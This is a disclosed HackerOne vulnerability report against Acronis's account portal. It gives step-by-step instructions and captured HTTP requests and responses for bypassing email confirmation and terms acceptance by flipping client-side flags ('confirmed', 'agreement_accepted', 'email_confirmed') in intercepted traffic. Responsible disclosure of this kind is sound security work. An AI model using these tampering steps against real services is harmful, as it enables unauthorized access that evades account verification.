# Account Confirmation bypass leads to acess some fucntionality 

## Report Details
- **Report ID**: 1121132
- **URL**: https://hackerone.com/reports/1121132
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-09T11:21:02.046Z
- **Disclosed**: 2021-03-30T09:21:45.768Z

## Reporter
- **Username**: atikna
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
STEPS:
1. Go to the URL https://account.acronis.com/#/auth/signup
2. Create a Business Account  
3. Intercept the request using burp suite 
4. Now intercept the response of given HTTP REQUEST below 
5. Change the field ```"confirmed":false ``` to ``` true ``` 
6. Even you can bypass Accept term condition by changing the field ``` "agreement_accepted":false ``` to ``` true ```
7. Forward the response and go to profile 
8. Under Profile ``` add contact details ``` and ``` billing details ```
9. Now logout and again login with the credentials you not able to that functionality 
10. But when you confirmed your email 
11. You will see that Details attacker entered bypassing email confirmation


HTTP REQUEST TO bypass email confirmation
======

```
GET /v2/account HTTP/1.1
Host: account.acronis.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://account.acronis.com/
Cookie:

```

HTTP RESPONSE 
====
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 09 Mar 2021 10:28:36 GMT
Content-Type: application/json
Connection: close
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
expires: -1
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
Access-Control-Allow-Credentials: false
Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, Cache-Control, Connection, DNT, Keep-Alive, If-Modified-Since, Origin, Save-Data, User-Agent, X-Requested-With, Content-Type
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
p3p: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 847

{"account":{"id":,"type":"enterprise","email":"dams0303+03@wearehackerone.com","title":" ","first":"test","last":"test","middle":"","company_name":"hackerone","occupation":"","industry":"","phone":"9971193792","fax":"","country":"IN","subscription_language":"en-GB","zip":"","state_province":"","city":"","address1":"","address2":"","updated_at":1615284826,"created_at":1615284826,"subscription_home":false,"subscription_corporate":false,"subscription_developer":false,"subscription_beta":false,"blacklist":false,"auto_gen_pwd":false,"confirmed":false,"dr_region_supported":true,"dr_trial_used":false,"beta_user":false,"agreement_accepted":true,"up_to_date":true,"requires_data":true,"tenants":{"enterprise":""},"contacts_supported":true,"company_type":"Reseller","company_size":"1-10","contacts":[]}}

```


WHILE Adding contact details follow the steps
====
1. Intercept the request 
2. change the ``` "email_confirmed":false ``` to ``` true ```

HTTP REQUEST TO Add contact details
======

```
PUT /v2/contacts/eff03f0f-10f5-4c17-9360-a400a0068cff HTTP/1.1
Host: account.acronis.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 330
Origin: https://account.acronis.com
Connection: close
Referer: https://account.acronis.com/
Cookie: 

{"id":"eff03f0f-10f5-4c17-9360-a400a0068cff","types":["technical"],"email":"dams0303+03@wearehackerone.com","address1":"","address2":"","country":"","state":"","city":"","zipcode":"","phone":"9971193792","firstname":"Test","lastname":"Test","title":"test","website":"","industry":"","organization_size":"","email_confirmed":false}

```

## Impact

Attacker is able to bypass the email confirmation to use some functionality which is only be used after email confirmation

## Attachments
No attachments
